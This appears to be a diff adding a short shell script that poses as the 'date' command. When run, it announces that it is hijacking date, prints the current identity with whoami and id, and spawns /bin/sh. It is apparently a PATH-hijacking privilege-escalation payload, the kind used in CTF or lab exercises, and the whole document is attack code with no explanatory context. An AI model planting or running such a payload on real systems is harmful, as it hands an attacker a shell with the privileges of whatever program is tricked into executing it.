@@ -1,0 +1,6 @@
+#!/bin/sh
+
+echo Hijacking date, you are now `whoami`
+/usr/bin/id
+echo Spawning shell...
+/bin/sh
